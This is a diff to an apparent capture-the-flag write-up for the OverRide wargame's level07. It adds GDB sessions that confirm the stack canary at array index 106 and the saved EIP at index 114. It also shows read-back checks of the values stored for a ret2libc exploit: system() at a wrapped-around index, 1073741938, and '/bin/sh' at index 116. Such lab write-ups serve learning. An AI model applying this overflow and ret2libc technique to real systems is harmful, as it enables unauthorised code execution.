@@ -58,6 +58,25 @@ canary offset = 0x1cc - 0x24 = 0x1a8 = 424 bytes
 
 So **index 106** in the array corresponds to the stack canary.
 
+### Vérification dans GDB
+
+On peut confirmer la valeur du canary en lisant l'index 106 via `read_number`, et en comparant avec la valeur lue dans GDB :
+
+```
+(gdb) b *0x080489d5                          ← canary check: mov 0x1cc(%esp),%esi
+(gdb) run
+Input command: read
+ Index: 106
+ Number at data[106] is 1389090816            ← valeur du canary (varie à chaque exécution)
+
+Input command: quit
+
+Breakpoint 1, 0x080489d5 in main ()
+
+(gdb) x/wx $esp+0x1cc                        ← canary slot dans le stack frame
+0xffffd63c: 0x52c5ac00                        ← même valeur (0x52c5ac00 = 1389090816)
+```
+
 ### Why this matters:
 The stack canary is checked before `main` returns. If it has been modified, the program calls `__stack_chk_fail` and aborts. We need to **not overwrite** the canary, or overwrite it with its original value.
 
@@ -82,6 +101,33 @@ Converting to hex: `4158936339 = 0xF7E45513` — this is a libc address, confirm
 We also check nearby indices to confirm:
 - **Index 115** = 1 (this will be `system`'s return address, i.e., argc)
 - **Index 116** = `0xFFFFD254` (a stack address, argv pointer)
+
+### Confirmation dans GDB
+
+On vérifie que l'index 114 correspond bien au saved EIP en comparant avec `info frame` :
+
+```
+(gdb) b *0x080489ea                          ← juste après le canary check, avant l'épilogue
+(gdb) run
+Input command: quit
+
+Breakpoint 1, 0x080489ea in main ()
+
+(gdb) info frame
+Stack level 0, frame at 0xffffd6a0:
+ eip = 0x80489ea in main; saved eip = 0xf7e45513
+ Saved registers:
+  ebx at 0xffffd690, esi at 0xffffd694,
+  edi at 0xffffd698, ebp at 0xffffd69c
+
+(gdb) x/wx $esp+0x24                         ← adresse de array[0] = base
+0xffffd494: 0x00000000
+
+(gdb) p/d (0xffffd69c + 4 - (0xffffd470 + 0x24)) / 4
+$1 = 114                                     ← saved EIP est bien à l'index 114 du tableau
+```
+
+On peut aussi vérifier directement : `array_base + 114*4 = array_base + 456`. L'adresse du saved EIP (`ebp + 4`) divisée par 4 relative à la base du tableau donne bien 114.
 
 ---
 
@@ -171,6 +217,7 @@ level07@OverRide:~$ ./level07
 Input command: store
  Number: 4159090384
  Index: 1073741938
+ Completed store command successfully
 ```
 
 ### Store the address of `"/bin/sh"` at index 116:
@@ -178,6 +225,21 @@ Input command: store
 Input command: store
  Number: 4160264172
  Index: 116
+ Completed store command successfully
+```
+
+### Vérification post-store avec `read`
+
+Avant de déclencher l'exploit, on peut relire les valeurs pour confirmer qu'elles sont en place :
+
+```
+Input command: read
+ Index: 114
+ Number at data[114] is 4159090384            ← 0xf7e6aed0 = system()
+
+Input command: read
+ Index: 116
+ Number at data[116] is 4160264172            ← 0xf7f897ec = "/bin/sh"
 ```
 
 ### Trigger the exploit:
